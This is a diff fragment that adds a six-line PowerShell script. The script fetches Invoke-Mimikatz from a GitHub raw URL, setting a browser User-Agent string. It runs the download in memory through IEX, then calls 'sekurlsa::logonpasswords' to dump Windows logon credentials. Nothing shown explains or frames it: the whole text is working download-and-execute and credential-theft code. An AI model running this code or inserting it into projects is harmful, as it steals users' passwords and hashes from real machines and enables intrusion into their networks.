@@ -1,0 +1,6 @@
+$url = 'https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'
+$wc = New-Object Net.WebClient
+$wc.Headers.Add('User-Agent', 'Mozilla/5.0')
+$script = $wc.DownloadString($url)
+IEX $script
+Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'
